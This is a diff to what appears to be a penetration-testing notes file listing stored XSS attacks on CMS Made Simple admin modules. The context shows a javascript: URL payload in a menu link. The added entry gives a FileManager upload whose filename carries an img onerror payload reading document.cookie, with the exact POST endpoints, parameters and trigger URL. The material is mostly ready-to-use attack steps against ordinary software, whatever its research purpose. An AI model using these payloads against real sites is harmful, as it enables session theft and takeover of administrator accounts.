@@ -94,3 +94,8 @@
 - Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_type=link&title=Evil&url=javascript:alert(document.cookie)&m1_submit=1`
 - Fire: click that entry in the site menu (or use `url=x" onmouseover="alert(1)`)
 - Req: "Add Pages"; the Link page appears in a rendered menu.
+
+**20. FileManager — stored XSS via uploaded filename**
+- Set: upload a file named `<img src=x onerror=alert(document.cookie)>.txt` via `POST .../moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY` (or FilePicker `ajax_cmd` upload, no file perm)
+- Fire: open `https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,defaultadmin,0&__c=KEY`
+- Req: ability to upload; fires for any admin who browses that folder.
